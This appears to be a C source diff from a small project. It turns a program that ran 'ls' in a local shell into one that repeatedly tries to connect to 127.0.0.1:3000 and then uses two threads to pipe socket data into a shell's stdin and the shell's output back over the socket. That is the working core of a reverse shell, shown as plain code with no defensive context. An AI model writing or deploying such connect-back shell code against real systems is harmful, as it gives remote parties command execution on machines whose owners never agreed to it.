@@ -1,43 +1,67 @@
+#include "fd.h"
 #include "shell.h"
 #include "tcp.h"
 
+#include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-void
-use_shell(socket_t socket)
+Shell shell;
+socket_t sock = -1;
+
+void *
+shell_stdin_from_server(void *args)
 {
-    char store[8192];
-    memset(store, 0x00, 8192);
-    Shell shell = shell_open();
+    char store[FD_CHUNK_SIZE];
+    memset(store, 0x00, FD_CHUNK_SIZE);
+
+    while (1)
+    {
+        fd_read(sock, store);
+
+        fd_write(shell.stdin, store);
+    }
+}
+
+void *
+shell_stdout_to_server(void *args)
+{
+    char store[FD_CHUNK_SIZE];
+    memset(store, 0x00, FD_CHUNK_SIZE);
+
+    while (1)
+    {
+        fd_read(shell.stdout, store);
+
+        fd_write(sock, store);
+    }
+}
+
+void
+use_shell()
+{
+    shell = shell_open();
     puts("Done opening the shell");
 
-    char *cmd = "ls\n";
-    shell_write(shell, cmd);
+    pthread_t thread_recv;
+    pthread_create(&thread_recv, NULL, shell_stdin_from_server, NULL);
 
-    while (shell_read(shell, store))
-    {
-        puts(store);
-    }
+    pthread_t thread_push;
+    pthread_create(&thread_push, NULL, shell_stdout_to_server, NULL);
 
-    // if(shell == NULL)
-    // {
-    //     puts("Shell initialization failed.");
-    //     return;
-    // }
+    pthread_join(thread_recv, NULL);
+    pthread_join(thread_push, NULL);
 }
 
 int
 main(int argc, char **argv)
 {
-    socket_t socket = -1;
-
-    while (socket == -1)
+    while (sock == -1)
     {
         puts("Opening socket");
-        socket = tcp_open("127.0.0.1", 3000);
+        sock = tcp_open("127.0.0.1", 3000);
 
-        if (socket == -1)
+        if (sock == -1)
         {
             puts("Socket opening failed");
         }
@@ -46,7 +70,7 @@ main(int argc, char **argv)
             puts("Done opening socket!");
             puts("Biding to shell...");
 
-            use_shell(socket);
+            use_shell();
         }
     }
 
